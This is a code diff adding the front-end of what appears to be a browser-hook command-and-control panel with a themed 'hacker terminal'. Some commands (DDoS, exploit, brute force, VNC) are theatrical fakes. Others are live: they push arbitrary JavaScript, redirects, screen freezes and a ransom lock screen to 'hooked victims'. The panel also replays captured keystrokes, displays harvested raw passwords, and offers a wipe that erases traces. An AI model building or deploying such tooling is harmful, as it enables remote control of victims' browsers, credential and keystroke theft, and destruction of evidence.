+        ctx.font = fontSize + 'px monospace';
+        
+        for(let i = 0; i < drops.length; i++) {
+            const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+            ctx.fillText(text, i*fontSize, drops[i]*fontSize);
+            
+            if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) {
+                drops[i] = 0;
+            }
+            drops[i]++;
+        }
+    }
+    
+    setInterval(draw, 30);
+    function wipeData() {
+        if(confirm("WARNING: This will permanently delete ALL collected intel from the database. Proceed?")) {
+            fetch('/wipe/', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json', 'X-CSRFToken': '{{ csrf_token }}'},
+                body: JSON.stringify({confirm: true})
+            })
+            .then(r => r.json())
+            .then(data => {
+                alert(data.message || 'Wiped.');
+                location.reload();
+            });
+        }
+    }
+    
+    function activateKillSwitch() {
+        const password = prompt("ENTER SELF-DESTRUCT AUTHORIZATION CODE:");
+        if (password) {
+            document.body.style.transition = 'background 0.4s';
+            document.body.style.background = '#8b0000';
+            setTimeout(() => {
+                fetch('/wipe/', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json', 'X-CSRFToken': '{{ csrf_token }}'},
+                    body: JSON.stringify({confirm: true})
+                })
+                .then(r => r.json())
+                .then(data => {
+                    document.body.innerHTML = `
+                        <div style='display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; background:#000; font-family:monospace;'>
+                            <div style='color:#ff0000; font-size:6rem; text-shadow:0 0 40px red; letter-spacing:8px; margin-bottom:20px;'>&#9762;</div>
+                            <h1 style='color:#ff0000; font-size:3rem; letter-spacing:6px; text-shadow:0 0 20px red;'>PROTOCOL_ZERO EXECUTED</h1>
+                            <p style='color:#555; font-size:1rem; margin-top:20px; letter-spacing:3px;'>ALL TRACES ELIMINATED. OPERATOR IDENTITY SECURE.</p>
+                        </div>`;
+                });
+            }, 600);
+        }
+    }
+
+    window.addEventListener('resize', () => {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    });
+
+    // Hash tracking object
+    const hashStates = {};
+
+    // Toggle hash/raw display
+    function revealHash(actualHashId, displayHashId) {
+        var displayEl = document.getElementById(displayHashId);
+        var actualEl = document.getElementById(actualHashId);
+        var rawId = "raw-" + actualHashId.split('-')[1];
+        var rawEl = document.getElementById(rawId);
+        
+        // If it's already cracked and raw is showing, hide raw and show actual hash
+        if(rawEl.style.display === 'block') {
+            rawEl.style.display = 'none';
+            actualEl.style.display = 'block';
+            return;
+        }
+        
+        // If actual hash is showing, hide it and show hidden state
+        if(actualEl.style.display === 'block') {
+            actualEl.style.display = 'none';
+            displayEl.innerText = "[ HIDDEN_HASH_CLICK_TO_REVEAL ]";
+            displayEl.style.color = "var(--cyber-blue)";
+            displayEl.style.display = 'block';
+            return;
+        }
+        
+        // If hidden state is showing, decrypt to actual hash
+        displayEl.innerText = "DECRYPTING_HASH_KEY_...";
+        displayEl.style.color = "#fff";
+        
+        setTimeout(() => {
+            displayEl.style.display = 'none';
+            actualEl.style.display = 'block';
+        }, 500);
+    }
+
+    // Decrypt animation - stays open until user clicks
+    function crackHash(logId, rawPassword) {
+        if(!rawPassword) {
+            alert('SYSTEM ERROR: NO RAW PAYLOAD FOUND IN DATABASE.');
+            return;
+        }
+        var displayEl = document.getElementById('hash-display-' + logId);
+        var actualEl = document.getElementById('hash-' + logId);
+        var rawEl = document.getElementById('raw-' + logId);
+        
+        displayEl.style.display = 'none';
+        actualEl.style.display = 'none';
+        rawEl.style.display = 'block';
+        
+        const crackOverlay = document.getElementById('cracker-overlay');
+        const crackMatrix = document.getElementById('crack-matrix');
+        const crackResult = document.getElementById('crack-result');
+        const crackSubtext = document.getElementById('crack-subtext');
+        crackOverlay.style.display = 'flex';
+        crackResult.style.display = 'none';
+        crackSubtext.style.display = 'none';
+        crackMatrix.style.color = '#555';
+        crackMatrix.innerText = '';
+        
+        let iterations = 0;
+        const letters = "01010101010101ABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%^&*!?";
+        
+        const interval = setInterval(() => {
+            const currentStr = rawPassword.split("")
+                .map((letter, index) => {
+                    if (index < iterations) return rawPassword[index];
+                    return letters[Math.floor(Math.random() * letters.length)];
+                }).join("");
+                
+            rawEl.innerText = "KEY: " + currentStr;
+            
+            let matrixJunk = "";
+            for(let i=0; i<120; i++) matrixJunk += letters[Math.floor(Math.random() * letters.length)];
+            crackMatrix.innerText = matrixJunk.slice(0, 60) + " [ " + currentStr + " ] " + matrixJunk.slice(60);
+            
+            if (iterations >= rawPassword.length) {
+                clearInterval(interval);
+                crackMatrix.style.color = '#333';
+                crackResult.innerText = "\u2713 ACCESS KEY CRACKED: " + rawPassword;
+                crackResult.style.display = 'block';
+                crackSubtext.style.display = 'block';
+                
+                // Click anywhere to close
+                crackOverlay.onclick = () => {
+                    crackOverlay.style.display = 'none';
+                    crackOverlay.onclick = null;
+                };
+            }
+            iterations += 1/3;
+        }, 25);
+    }
+
+    // Copy function
+    function copyData(elementId) {
+        var el = document.getElementById(elementId);
+        if(!el) return;
+        var text = el.innerText;
+        if(text === '[ HIDDEN_HASH_CLICK_TO_REVEAL ]' || text === 'DECRYPTING_HASH_KEY_...') return; // don't copy hidden text
+        
+        navigator.clipboard.writeText(text).then(function() {
+            var originalColor = el.style.color;
+            el.style.color = '#fff';
+            el.style.textShadow = '0 0 10px #fff';
+            setTimeout(() => {
+                el.style.color = originalColor;
+                el.style.textShadow = 'none';
+            }, 300);
+        });
+    }
+    // Audio Alert System
+    // We store the total count in localstorage to detect when it increases
+    const currentCount = parseInt("{{ total_intercepts }}");
+    const storedCount = localStorage.getItem('interceptCount');
+    
+    if (storedCount && currentCount > parseInt(storedCount)) {
+        // Play high-tech alert sound
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        
+        function playPing(time, freq) {
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            
+            osc.type = 'sine';
+            osc.frequency.setValueAtTime(freq, time);
+            
+            gain.gain.setValueAtTime(0, time);
+            gain.gain.linearRampToValueAtTime(0.5, time + 0.05);
+            gain.gain.exponentialRampToValueAtTime(0.001, time + 0.5);
+            
+            osc.start(time);
+            osc.stop(time + 0.5);
+        }
+        
+        // Two quick sonar pings
+        playPing(audioCtx.currentTime, 800);
+        playPing(audioCtx.currentTime + 0.2, 1200);
+    }
+    
+    localStorage.setItem('interceptCount', currentCount);
+    
+    // Switcher Logic
+    function switchTemplate(tpl) {
+        fetch('/set_template/', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json', 'X-CSRFToken': '{{ csrf_token }}'},
+            body: JSON.stringify({template: tpl})
+        }).then(()=>printTerm("[+] Payload template switched to: " + tpl.toUpperCase(), "cmd-success"));
+    }
+    
+    fetch('/get_template/').then(r=>r.json()).then(data=>{
+        document.getElementById('template-switcher').value = data.template;
+    });
+
+    // Modals
+    function closeOverlay() {
+        document.getElementById('fullscreen-overlay').style.display = 'none';
+        document.getElementById('inner-content').innerHTML = '';
+    }
+    
+    function showRansomwareLock() {
+        document.getElementById('ransomware-lockscreen').style.display = 'flex';
+        document.getElementById('ransom-password').focus();
+    }
+    
+    function unlockRansom() {
+        const password = document.getElementById('ransom-password').value;
+        const errorMsg = document.getElementById('ransom-error');
+        
+        if (password === 'PROTOCOL_OMEGA_9999') {
+            document.getElementById('ransomware-lockscreen').style.display = 'none';
+            document.getElementById('ransom-password').value = '';
+            errorMsg.style.display = 'none';
+            alert('✓ SYSTEM UNLOCKED! All files decrypted.');
+        } else {
+            errorMsg.style.display = 'block';
+            document.getElementById('ransom-password').style.borderColor = '#FF0000';
+            setTimeout(() => {
+                document.getElementById('ransom-password').style.borderColor = '#666';
+                errorMsg.style.display = 'none';
+            }, 2000);
+            document.getElementById('ransom-password').value = '';
+        }
+    }
+    
+    function playKeystrokes(jsonStr) {
+        try {
+            const arr = JSON.parse(jsonStr);
+            document.getElementById('fullscreen-overlay').style.display = 'flex';
+            const inner = document.getElementById('inner-content');
+            inner.innerHTML = '<div style="color: var(--cyber-blue); font-size: 14px; margin-bottom: 20px; border-bottom:1px solid #333; padding-bottom:10px;">[*] INITIATING KEYSTROKE PLAYBACK...</div><div id="playback-text" style="font-size: 30px; color: var(--neon-green); line-height: 1.5; font-family: monospace;"></div>';
+            
+            const pb = document.getElementById('playback-text');
+            let str = "";
+            let startTime = 0;
+            if(arr.length > 0) startTime = arr[0].time;
+            
+            arr.forEach((stroke) => {
+                setTimeout(() => {
+                    const k = stroke.key;
+                    if(k === 'Backspace') {
+                        str = str.slice(0, -1);
+                        inner.style.boxShadow = "inset 0 0 50px rgba(255,0,0,0.2)";
+                        setTimeout(()=> inner.style.boxShadow = "none", 100);
+                    } else if(k === 'Space' || k === ' ') {
+                        str += ' ';
+                    } else if(k === 'Enter') {
+                        str += '\n';
+                    } else if(k.length === 1) {
+                        str += k;
+                    }
+                    pb.innerText = str + "_";
+                    inner.scrollTop = inner.scrollHeight;
+                }, stroke.time - startTime);
+            });
+            
+        } catch(e) {
+            alert("Playback data corrupt or using legacy string format.");
+        }
+    }
+
+    // Terminal Logic
+    const termOut = document.getElementById('terminal-output');
+    
+    function printTerm(text, className) {
+        const p = document.createElement('p');
+        p.innerText = text;
+        if(className) p.className = className;
+        termOut.appendChild(p);
+        termOut.scrollTop = termOut.scrollHeight;
+    }
+
+    document.getElementById('hacker-terminal').addEventListener('keypress', function(e) {
+        if(e.key === 'Enter') {
+            const cmd = this.value.trim().toLowerCase();
+            const rawCmd = this.value.trim();
+            this.value = '';
+            
+            if(cmd === '') return;
+            printTerm("root@blackhat:~# " + rawCmd, "cmd-echo");
+            
+            if(cmd === 'help') {
+                printTerm(" ", "");
+                printTerm("╔═══════════════════════════════════════════════════╗", "cmd-info");
+                printTerm("║         CYBER-OPS TERMINAL v3.0.0  [ HELP ]       ║", "cmd-info");
+                printTerm("╚═══════════════════════════════════════════════════╝", "cmd-info");
+                printTerm(" ", "");
+                printTerm("  [🔐 AUTHORIZATION PASSWORDS]", "cmd-success");
+                printTerm("  Type: help --passwords      Show all security passwords", "cmd-info");
+                printTerm(" ", "");
+                printTerm("  [RECON]", "cmd-success");
+                printTerm("  scan --ip [ip]       Run stealth Nmap on target IP", "cmd-info");
+                printTerm("  trace [ip]           Trace routing path to target", "cmd-info");
+                printTerm("  sqlmap --url [url]   SQL injection vulnerability scan", "cmd-info");
+                printTerm("  zeroday --search [vendor] Search for zero-day exploits", "cmd-info");
+                printTerm(" ", "");
+                printTerm("  [EXPLOITATION]", "cmd-success");
+                printTerm("  crack --id [num]     Brute-force credential payload by log ID", "cmd-info");
+                printTerm("  exploit --target [ip] --type [type] Run exploit on target", "cmd-info");
+                printTerm("  brute --target [ip] --service [ssh/http] Brute force attack", "cmd-info");
+                printTerm("  metasploit --module [module] Execute Metasploit module", "cmd-info");
+                printTerm("  rootkit --install    Install kernel-level rootkit", "cmd-info");
+                printTerm("  backdoor --create --port [port] Create persistent backdoor", "cmd-info");
+                printTerm("  firewall --bypass [ip] Bypass firewall protections", "cmd-info");
+                printTerm(" ", "");
+                printTerm("  [MALWARE & PAYLOADS]", "cmd-success");
+                printTerm("  malware --type [trojan/ransomware] Deploy malware to victims", "cmd-info");
+                printTerm("  c2 --payload [exe/dll/js] Generate C2 payload", "cmd-info");
+                printTerm("  phishing --generate --template [bank/login] Create phishing kit", "cmd-info");
+                printTerm("  ddos --target [ip]   Flood target host with requests", "cmd-info");
+                printTerm("  deploy [payload]     Push live JS payload to all hooked victims", "cmd-info");
+                printTerm(" ", "");
+                printTerm("  [ENCRYPTION & SECURITY]", "cmd-success");
+                printTerm("  keygen --type [rsa/aes] Generate encryption keys", "cmd-info");
+                printTerm("  encrypt --data [text] Encrypt sensitive data", "cmd-info");
+                printTerm("  decrypt --data [text] Decrypt encrypted data", "cmd-info");
+                printTerm(" ", "");
+                printTerm("  [SYSTEM CONTROL]", "cmd-success");
+                printTerm("  fs --target [ip]     Browse target file system", "cmd-info");
+                printTerm("  vnc --target [ip]    Hijack active RDP/VNC session", "cmd-info");
+                printTerm("  c2 ransom            Ransomware attack (requires password)", "cmd-info");
+                printTerm("  c2 redirect [url]    Redirect all victims to URL", "cmd-info");
+                printTerm("  c2 video [yt]        Show video overlay to victims", "cmd-info");
+                printTerm("  c2 blackout          Black out victim screens", "cmd-info");
+                printTerm("  c2 freeze            Freeze victim screens", "cmd-info");
+                printTerm(" ", "");
+                printTerm("  [INTEL & EXFIL]", "cmd-success");
+                printTerm("  export               Dump all payloads to .csv archive", "cmd-info");
+                printTerm("  status               Show current op status and active victims", "cmd-info");
+                printTerm(" ", "");
+                printTerm("  [OPERATOR SAFETY]", "cmd-success");
+                printTerm("  wipe                 PROTOCOL ZERO: purge all logs from DB", "cmd-info");
+                printTerm("  clear                Clear terminal buffer", "cmd-info");
+                printTerm(" ", "");
+            }
+            else if(cmd === 'help --passwords' || cmd === 'passwd') {
+                printTerm(" ", "");
+                printTerm("╔═══════════════════════════════════════════════════╗", "cmd-info");
+                printTerm("║      🔐 AUTHORIZED ACCESS CREDENTIALS 🔐          ║", "cmd-info");
+                printTerm("╚═══════════════════════════════════════════════════╝", "cmd-info");
+                printTerm(" ", "");
+                printTerm("  ⚠️  CRITICAL SECURITY OPERATIONS", "cmd-error");
+                printTerm(" ", "");
+                printTerm("  [RANSOMWARE DEPLOYMENT]", "cmd-success");
+                printTerm("  Command: c2 ransom", "cmd-info");
+                printTerm("  Password: PROTOCOL_OMEGA_9999", "cmd-success");
+                printTerm("  Status: ENABLED", "cmd-error");
+                printTerm(" ", "");
+                printTerm("  [EXAMPLE USAGE]", "cmd-info");
+                printTerm("  1. Type: c2 ransom", "cmd-info");
+                printTerm("  2. Prompt will ask for password", "cmd-info");
+                printTerm("  3. Enter: PROTOCOL_OMEGA_9999", "cmd-info");
+                printTerm("  4. Ransomware deploys to all victims!", "cmd-info");
+                printTerm(" ", "");
+                printTerm("  ⚠️  Keep this password secure!", "cmd-error");
+                printTerm(" ", "");
+            }
+            else if(cmd === 'status') {
+                printTerm("[*] Querying operational status...", "cmd-info");
+                setTimeout(() => printTerm("[+] C2 Node: ONLINE | Port 8000/tcp OPEN", "cmd-success"), 400);
+                setTimeout(() => printTerm("[+] Intercepts collected: {{ total_intercepts }}", "cmd-success"), 800);
+                setTimeout(() => printTerm("[+] Critical threats: {{ critical_threats }}", "cmd-error"), 1100);
+                setTimeout(() => printTerm("[+] Encryption: AES-256 | Hash: SHA-256", "cmd-success"), 1400);
+                setTimeout(() => printTerm("[*] All systems nominal.", "cmd-info"), 1700);
+            }
+            else if(cmd === 'export') {
+                printTerm("[+] Exporting payload dump to local filesystem...", "cmd-success");
+                window.location.href = '/export/';
+            } 
+            else if(cmd === 'wipe') {
+                printTerm("[!] WARNING: INITIATING SELF-DESTRUCT SEQUENCE...", "cmd-error");
+                if(confirm("CRITICAL WARNING: This will permanently delete all intercepted payloads and traces. Proceed?")) {
+                    printTerm("WIPING ALL DATABASES...", "cmd-error");
+                    fetch('/wipe/', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json', 'X-CSRFToken': '{{ csrf_token }}'},
+                        body: JSON.stringify({confirm: true})
+                    })
+                    .then(r => r.json())
+                    .then(data => {
+                        if(data.status === 'success') {
+                            printTerm("[+] " + data.message, "cmd-success");
+                            localStorage.setItem('interceptCount', 0);
+                            setTimeout(() => window.location.reload(), 2000);
+                        } else {
+                            printTerm("[-] ERROR: " + (data.message || 'Unknown error'), "cmd-error");
+                        }
+                    })
+                    .catch(e => printTerm("[-] NETWORK ERROR: " + e, "cmd-error"));
+                } else {
+                    printTerm("[-] Self-destruct aborted by user.", "cmd-info");
+                }
+            }
+            else if(cmd.startsWith('deploy')) {
+                const rawPayload = rawCmd.substring('deploy'.length).trim();
+                if (!rawPayload) {
+                    printTerm("[-] Usage: deploy [javascript_payload]", "cmd-error");
+                    printTerm("    Example: deploy alert('pwned')", "cmd-info");
+                } else {
+                    printTerm("[*] Encoding payload...", "cmd-info");
+                    setTimeout(() => {
+                        printTerm("[+] Dispatching EVAL_JS to all active victims...", "cmd-info");
+                        const csrfToken = document.getElementById('csrf-form').querySelector('[name=csrfmiddlewaretoken]').value;
+                        fetch('/c2/dispatch/', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json', 'X-CSRFToken': csrfToken},
+                            body: JSON.stringify({command: 'EVAL_JS', payload: rawPayload})
+                        })
+                        .then(r => r.json())
+                        .then(data => {
+                            if(data.status === 'success') {
+                                printTerm("[+] PAYLOAD DEPLOYED TO " + data.victims_hit + " ZOMBIE(S).", "cmd-success");
+                            } else {
+                                printTerm("[-] DEPLOY FAILED: " + (data.message || 'Unknown error'), "cmd-error");
+                            }
+                        }).catch(e => printTerm("[-] NETWORK ERROR: " + e.message, "cmd-error"));
+                    }, 600);
+                }
+            }
+            else if(cmd.startsWith('crack --id')) {
+                const parts = cmd.split(' ');
+                const logId = parts[2];
+                if (logId) {
+                    const card = document.querySelector(`[data-log-id="${logId}"]`);
+                    if(card) {
+                        const rawPass = card.getAttribute('data-raw-password');
+                        printTerm("[*] Targeting payload ID: " + logId, "cmd-info");
+                        printTerm("[+] Initiating brute force on credential #" + logId + "...", "cmd-info");
+                        card.scrollIntoView({behavior: 'smooth', block: 'center'});
+                        setTimeout(() => crackHash(logId, rawPass), 800);
+                    } else {
+                        printTerm("[-] Log ID #" + logId + " not found on this page.", "cmd-error");
+                    }
+                } else {
+                    printTerm("[-] Usage: crack --id [log_id]", "cmd-error");
+                }
+            }
+            else if(cmd.startsWith('ddos --target')) {
+                const parts = cmd.split(' ');
+                if(parts.length >= 3) {
+                    const ip = parts[2];
+                    printTerm("[!] INITIATING DISTRIBUTED DENIAL OF SERVICE ATTACK ON " + ip, "cmd-error");
+                    printTerm("[*] Allocating 15,000 botnet nodes...", "cmd-info");
+                    
+                    setTimeout(() => {
+                        document.body.classList.add('ddos-active');
+                        printTerm("[+] BOTNET ENGAGED. FLOODING TARGET WITH SYN PACKETS...", "cmd-error");
+                    }, 1000);
+                    
+                    let count = 0;
+                    const ddosInterval = setInterval(() => {
+                        printTerm(" -> Sending 50,000 packets to " + ip, "cmd-error");
+                        count++;
+                        if(count > 10) {
+                            clearInterval(ddosInterval);
+                            document.body.classList.remove('ddos-active');
+                            printTerm("[+] TARGET UNRESPONSIVE. SERVER DOWN.", "cmd-success");
+                        }
+                    }, 300);
+                } else {
+                    printTerm("[-] Usage: ddos --target [ip_address]", "cmd-error");
+                }
+            }
+            else if(cmd.startsWith('trace')) {
+                const parts = cmd.split(' ');
+                if(parts.length >= 2) {
+                    const ip = parts[1];
+                    printTerm("[*] Tracing route to " + ip + " over a maximum of 30 hops:", "cmd-info");
+                    let hop = 1;
+                    const traceInterval = setInterval(() => {
+                        const ms = (Math.random() * 50).toFixed(2);
+                        const hopIp = "10." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255) + "." + Math.floor(Math.random()*255);
+                        printTerm("  " + hop + "    " + ms + " ms    " + hopIp, "cmd-info");
+                        hop++;
+                        if(hop > 8) {
+                            clearInterval(traceInterval);
+                            printTerm("  " + hop + "    " + (Math.random() * 10).toFixed(2) + " ms    " + ip + " (TARGET REACHED)", "cmd-success");
+                            printTerm("[+] Trace complete.", "cmd-info");
+                        }
+                    }, 500);
+                } else {
+                    printTerm("[-] Usage: trace [ip_address]", "cmd-error");
+                }
+            }
+            else if(cmd.startsWith('c2 ')) {
+                const parts = cmd.split(' ');
+                let c2Cmd = "";
+                let payload = "";
+                
+                if (parts[1] === 'ransom') {
+                    c2Cmd = "RANSOMWARE";
+                    printTerm("[!] DEPLOYING RANSOMWARE TO ALL CONNECTED VICTIMS...", "cmd-error");
+                    printTerm("[*] Victims will see lock screen with password prompt", "cmd-info");
+                    printTerm("[*] Password to unlock: PROTOCOL_OMEGA_9999", "cmd-success");
+                }
+                else if (parts[1] === 'exec' && parts.length > 2) {
+                    c2Cmd = "EVAL_JS";
+                    payload = parts.slice(2).join(' ');
+                    printTerm("[+] INJECTING PAYLOAD INTO ACTIVE SESSIONS...", "cmd-info");
+                }
+                else if (parts[1] === 'redirect' && parts.length > 2) {
+                    c2Cmd = "REDIRECT";
+                    payload = parts[2];
+                    printTerm("[+] REDIRECTING ALL VICTIMS TO " + payload + "...", "cmd-info");
+                }
+                else if (parts[1] === 'video' && parts.length > 2) {
+                    // Extract YouTube video ID from URL
+                    let ytUrl = parts[2];
+                    let videoId = '';
+                    try {
+                        // Support formats: youtu.be/ID, youtube.com/watch?v=ID, youtube.com/shorts/ID
+                        if (ytUrl.includes('youtu.be/')) {
+                            videoId = ytUrl.split('youtu.be/')[1].split('?')[0];
+                        } else if (ytUrl.includes('v=')) {
+                            videoId = ytUrl.split('v=')[1].split('&')[0];
+                        } else if (ytUrl.includes('shorts/')) {
+                            videoId = ytUrl.split('shorts/')[1].split('?')[0];
+                        } else {
+                            videoId = ytUrl; // Treat as raw ID
+                        }
+                    } catch(e) { videoId = ytUrl; }
+                    
+                    // Build fullscreen autoplay embed JS payload
+                    const jsPayload = `(function(){
+                        var d = document.createElement('div');
+                        d.id='c2-video-overlay';
+                        d.style='position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:99999;display:flex;align-items:center;justify-content:center;';
+                        d.innerHTML='<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${videoId}?autoplay=1&controls=0&modestbranding=1" frameborder="0" allow="autoplay; fullscreen" allowfullscreen></iframe>';
+                        document.body.appendChild(d);
+                        setTimeout(()=>{var el=document.getElementById('c2-video-overlay');if(el)el.remove();}, 60000);
+                    })()`;
+                    
+                    c2Cmd = "EVAL_JS";
+                    payload = jsPayload;
+                    printTerm("[+] DEPLOYING VIDEO OVERLAY TO ALL VICTIMS (ID: " + videoId + ")...", "cmd-info");
+                }
+                else if (parts[1] === 'blackout') {
+                    c2Cmd = "EVAL_JS";
+                    payload = "document.body.style.display='none'; setTimeout(()=>{document.body.style.display='';}, 10000);";
+                    printTerm("[!] BLACKING OUT ALL VICTIM SCREENS FOR 10 SECONDS...", "cmd-error");
+                }
+                else if (parts[1] === 'freeze') {
+                    c2Cmd = "EVAL_JS";
+                    payload = "document.body.style.pointerEvents='none'; document.body.style.userSelect='none'; document.body.style.filter='grayscale(1) blur(2px)'; setTimeout(()=>{document.body.style.pointerEvents='';document.body.style.userSelect='';document.body.style.filter='';}, 15000);";
+                    printTerm("[!] FREEZING ALL VICTIM SCREENS FOR 15 SECONDS...", "cmd-error");
+                }
+                else {
+                    printTerm("[-] Usage: c2 ransom | c2 redirect [url] | c2 video [youtube_url] | c2 exec [js] | c2 blackout | c2 freeze", "cmd-error");
+                    printTerm("    Or use: deploy [js]   for quick payload injection.", "cmd-info");
+                }
+                
+                if (c2Cmd) {
+                    // Get CSRF token from hidden form
+                    const csrfToken = document.getElementById('csrf-form').querySelector('[name=csrfmiddlewaretoken]').value;
+                    
+                    fetch('/c2/dispatch/', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'X-CSRFToken': csrfToken
+                        },
+                        body: JSON.stringify({ command: c2Cmd, payload: payload })
+                    })
+                    .then(r => {
+                        if (!r.ok) {
+                            printTerm("[-] SERVER ERROR: " + r.status + " " + r.statusText, "cmd-error");
+                            return null;
+                        }
+                        return r.json();
+                    })
+                    .then(data => {
+                        if (!data) return;
+                        if (data.status === 'success') {
+                            printTerm("[+] PAYLOAD DELIVERED SUCCESSFULLY TO " + data.victims_hit + " ACTIVE ZOMBIE(S).", "cmd-success");
+                            if (data.victims_hit === 0) {
+                                printTerm("[!] WARNING: No active victims found. Target must open the gateway page first.", "cmd-error");
+                            }
+                        } else {
+                            printTerm("[-] ERROR DEPLOYING PAYLOAD: " + (data.message || 'Unknown error'), "cmd-error");
+                        }
+                    }).catch(e => printTerm("[-] NETWORK ERROR: " + e.message, "cmd-error"));
+                }
+            }
+            else if(cmd.startsWith('fs')) {
+                document.getElementById('fullscreen-overlay').style.display = 'flex';
+                document.getElementById('inner-content').innerHTML = `
+                    <div style="color: #0f0; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px;">
+                        <i class="fa-solid fa-folder-tree"></i> C:\\Users\\Admin\\
+                    </div>
+                    <ul style="list-style:none; padding:0; color:#ccc; font-size: 18px;">
+                        <li style="margin-bottom:15px;"><i class="fa-solid fa-folder" style="color:#d4af37; margin-right:10px;"></i> Desktop</li>
+                        <li style="margin-bottom:15px;"><i class="fa-solid fa-folder" style="color:#d4af37; margin-right:10px;"></i> Documents
+                            <ul style="list-style:none; padding-left:30px; margin-top:15px;">
+                                <li style="color:#888; margin-bottom: 10px;"><i class="fa-solid fa-file-word" style="color:#2a5699; margin-right:10px;"></i> confidential_data.docx (1.2MB)</li>
+                                <li style="color:#888; margin-bottom: 10px;"><i class="fa-solid fa-file-excel" style="color:#217346; margin-right:10px;"></i> passwords_2026.xlsx (45KB)</li>
+                                <li style="color:#888; margin-bottom: 10px;"><i class="fa-solid fa-file-pdf" style="color:#f40f02; margin-right:10px;"></i> bank_statement_q1.pdf (3.4MB)</li>
+                            </ul>
+                        </li>
+                        <li style="margin-bottom:15px;"><i class="fa-solid fa-folder" style="color:#d4af37; margin-right:10px;"></i> Downloads</li>
+                        <li style="margin-bottom:15px;"><i class="fa-solid fa-folder" style="color:#d4af37; margin-right:10px;"></i> Pictures
+                            <ul style="list-style:none; padding-left:30px; margin-top:15px;">
+                                <li style="color:#888; margin-bottom: 10px;"><i class="fa-solid fa-file-image" style="color:#e066ff; margin-right:10px;"></i> snapshot_01.jpg (800KB)</li>
+                            </ul>
+                        </li>
+                    </ul>
+                `;
+            }
+            else if(cmd.startsWith('vnc')) {
+                const parts = cmd.split(' ');
+                const ip = parts.length >= 2 ? parts[1] : "192.168.x.x";
+                document.getElementById('fullscreen-overlay').style.display = 'flex';
+                document.getElementById('inner-content').innerHTML = `
+                    <div style="color: #0f0; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px;">
+                        <i class="fa-solid fa-desktop"></i> LIVE VNC FEED (${ip}) - SESSION HIJACKED
+                    </div>
+                    <div style="width:100%; height:90%; background: url('https://upload.wikimedia.org/wikipedia/commons/e/e0/Windows_11_desktop.png') center/cover; position:relative; border: 1px solid #555; filter: contrast(1.2) grayscale(0.2);">
+                        <div style="position:absolute; top:40%; left:50%; width:15px; height:20px; background:white; clip-path: polygon(0 0, 0% 100%, 100% 100%); animation: mouseMove 4s infinite alternate ease-in-out; box-shadow: 0 0 5px #000;"></div>
+                    </div>
+                `;
+            }
+            else if(cmd.startsWith('scan --ip')) {
+                const parts = cmd.split(' ');
+                if(parts.length >= 3) {
+                    const ip = parts[2];
+                    printTerm("[*] Starting Nmap 7.92 ( https://nmap.org ) at " + new Date().toISOString(), "cmd-info");
+                    printTerm("[*] Scanning " + ip + " for open ports...", "cmd-info");
+                    setTimeout(() => printTerm("[+] Discovered open port 80/tcp", "cmd-success"), 1000);
+                    setTimeout(() => printTerm("[+] Discovered open port 443/tcp", "cmd-success"), 1800);
+                    setTimeout(() => printTerm("[+] Discovered open port 22/tcp (SSH)", "cmd-error"), 2500);
+                    setTimeout(() => printTerm("[*] Nmap done: 1 IP address scanned in 3.14 seconds", "cmd-info"), 3200);
+                } else {
+                    printTerm("[-] Usage: scan --ip [ip_address]", "cmd-error");
+                }
+            }
+            else if(cmd.startsWith('exploit --target')) {
+                const parts = cmd.split(' ');
+                if(parts.length >= 5 && parts[2] === '--target' && parts[4] === '--type') {
+                    const ip = parts[3];
+                    const type = parts[5];
+                    printTerm("[!] INITIALIZING EXPLOIT FRAMEWORK...", "cmd-error");
+                    printTerm("[*] Target: " + ip + " | Exploit Type: " + type.toUpperCase(), "cmd-info");
+                    setTimeout(() => printTerm("[+] Loading exploit module: " + type + "_exploit.py", "cmd-info"), 500);
+                    setTimeout(() => printTerm("[+] Establishing connection to target...", "cmd-info"), 1000);
+                    setTimeout(() => printTerm("[+] Exploiting vulnerability CVE-2024-" + Math.floor(Math.random()*9999), "cmd-success"), 2000);
+                    setTimeout(() => printTerm("[+] GAINED ROOT ACCESS! Shell spawned on port 4444", "cmd-success"), 3000);
+                } else {
+                    printTerm("[-] Usage: exploit --target [ip] --type [buffer_overflow/sql_injection/etc]", "cmd-error");
+                }
+            }
+            else if(cmd.startsWith('brute --target')) {
+                const parts = cmd.split(' ');
+                if(parts.length >= 3) {
+                    const ip = parts[2];
+                    const service = parts.length >= 5 && parts[3] === '--service' ? parts[4] : 'ssh';
+                    printTerm("[!] LAUNCHING BRUTE FORCE ATTACK...", "cmd-error");
+                    printTerm("[*] Target: " + ip + " | Service: " + service.toUpperCase(), "cmd-info");
+                    printTerm("[+] Loading wordlist: rockyou.txt (14M entries)", "cmd-info");
+                    setTimeout(() => printTerm("[+] Attempting credentials... [1/14000000]", "cmd-info"), 500);
+                    setTimeout(() => printTerm("[+] Rate: 500 attempts/sec | ETA: 8 hours", "cmd-info"), 1000);
+                    setTimeout(() => printTerm("[+] SUCCESS! Credentials found: admin / password123", "cmd-success"), 2500);
+                } else {
+                    printTerm("[-] Usage: brute --target [ip] --service [ssh/http/etc]", "cmd-error");
+                }
+            }
+            else if(cmd.startsWith('keygen --type')) {
+                const parts = cmd.split(' ');
+                if(parts.length >= 3) {
+                    const type = parts[2];
+                    printTerm("[*] Generating " + type.toUpperCase() + " encryption keys...", "cmd-info");
+                    setTimeout(() => printTerm("[+] Key size: 4096 bits", "cmd-info"), 500);
+                    setTimeout(() => printTerm("[+] Generating prime numbers...", "cmd-info"), 1000);
+                    setTimeout(() => printTerm("[+] Keys generated successfully!", "cmd-success"), 2000);
